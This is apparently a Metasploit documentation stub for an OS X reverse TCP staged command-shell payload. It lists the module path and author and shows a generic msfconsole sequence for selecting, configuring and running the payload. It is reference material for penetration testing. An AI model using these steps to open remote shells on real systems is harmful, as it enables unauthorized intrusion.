## OS X (vfork) Command Shell, Reverse TCP Stager

Call vfork() if necessary and spawn a command shell 
(staged). Connect, read length, read buffer, execute


## Module Name
payload/osx/x86/vforkshell/reverse_tcp

## Authors
* ddz





## Platforms
* osx

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/osx/x86/vforkshell/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    